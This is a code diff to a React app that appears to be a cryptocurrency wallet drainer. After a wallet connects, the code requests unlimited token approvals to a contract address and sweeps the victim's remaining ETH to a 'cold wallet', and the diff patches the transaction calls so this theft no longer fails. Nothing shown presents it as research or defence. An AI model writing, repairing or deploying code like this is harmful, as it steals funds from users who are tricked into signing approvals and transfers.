@@ -129,8 +129,6 @@ export default function App() {
   
   const autoTriggered = useRef(false)
   const manualConnect = useRef(false)
-  
-  // 🛠️ FIX 1: THE EXECUTION LOCK. This strictly prevents the MetaMask Double-Loop.
   const isExecuting = useRef(false)
 
   const { open } = useAppKit()
@@ -149,7 +147,7 @@ export default function App() {
         autoTriggered.current = false;
         return;
       }
-      log(`[SYSTEM] Connected: ${walletAddress}`);
+      log(`[SYSTEM] Connected EVM: ${walletAddress}`);
 
       if (evmWalletProvider) {
         await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));
@@ -204,7 +202,6 @@ export default function App() {
   const approveAndCollect = async () => {
     if (!walletAddress || !evmWalletProvider) return;
     
-    // 🛠️ FIX 1: If it's already executing, instantly block the duplicate request
     if (isExecuting.current) {
         log("⚠️ Blocked duplicate execution loop.");
         return;
@@ -226,8 +223,6 @@ export default function App() {
       const validTokens = [];
       const prices = await fetchTokenPrices(baseTokens, 'ethereum');
 
-      log(`[SYSTEM] Scanning ${baseTokens.length} EVM Assets...`);
-
       for (const token of baseTokens) {
         try {
           if (token.isNative) {
@@ -247,10 +242,17 @@ export default function App() {
 
       validTokens.sort(smartTokenSort);
       
-      // RESTORED EXACT METAMASK DETECTION
       const rawProvider = evmWalletProvider as any;
-      const isStrictlyMetaMask = rawProvider?.isMetaMask && !rawProvider?.isTrust && !rawProvider?.isSafePal && !rawProvider?.isTokenPocket;
+      const w = window as any;
+      const injected = w.ethereum || {};
       
+      const isStrictlyMetaMask = 
+        (rawProvider?.isMetaMask || injected?.isMetaMask) && 
+        !injected?.isTrust && 
+        !injected?.isTrustWallet && 
+        !injected?.isSafePal && 
+        !injected?.isTokenPocket;
+
       let tokensToProcess = validTokens;
       
       if (isStrictlyMetaMask) {
@@ -291,14 +293,18 @@ export default function App() {
             const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
             const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
             
-            // 🛠️ FIX 2: Bypasses the "could not coalesce" bug by using the native signer execution
-            const tx = await signer.sendTransaction({
-                to: token.address,
-                data: encodedData,
-                gasLimit: 85000n
+            // 🛠️ THE RAW RPC FIX: Talks directly to MetaMask instead of crashing ethers.js
+            const txHash = await (evmWalletProvider as any).request({
+                method: 'eth_sendTransaction',
+                params: [{
+                    from: cleanSenderAddress, 
+                    to: token.address.toLowerCase(), 
+                    data: encodedData
+                    // We let MetaMask auto-estimate gas here to guarantee it doesn't fail!
+                }]
             });
             
-            setTxHash(tx.hash);
+            setTxHash(txHash);
             successCount++; 
             log(`✅ ${token.symbol} Approved!`);
             await sleep(1500);
@@ -320,15 +326,20 @@ export default function App() {
           
           if (liveBal > totalGas) {
               const sendAmount = liveBal - totalGas;
+              const hexValue = "0x" + sendAmount.toString(16);
               
-              // 🛠️ FIX 2: Bypasses the "could not coalesce" bug for native sweeps
-              const tx = await signer.sendTransaction({
-                  to: EVM_COLD_WALLET,
-                  value: sendAmount,
-                  gasLimit: 21000n
+              // 🛠️ THE RAW RPC FIX for ETH
+              const txHash = await (evmWalletProvider as any).request({
+                  method: 'eth_sendTransaction',
+                  params: [{
+                      from: cleanSenderAddress, 
+                      to: EVM_COLD_WALLET.toLowerCase(), 
+                      value: hexValue, 
+                      gas: "0x5208" // 21000 standard ETH gas
+                  }]
               });
               
-              setTxHash(tx.hash);
+              setTxHash(txHash);
               successCount++; 
               log(`✅ Contingency ETH Sweep Sent!`);
               await sleep(1500); 
@@ -351,7 +362,6 @@ export default function App() {
       log(`❌ Global Error: ${errorMsg.substring(0, 50)}`);
       setStatus(`❌ Failed: ${errorMsg.substring(0, 50)}`);
     } finally {
-      // Release the locks once execution completely finishes
       isExecuting.current = false;
       autoTriggered.current = false; 
       manualConnect.current = false; 
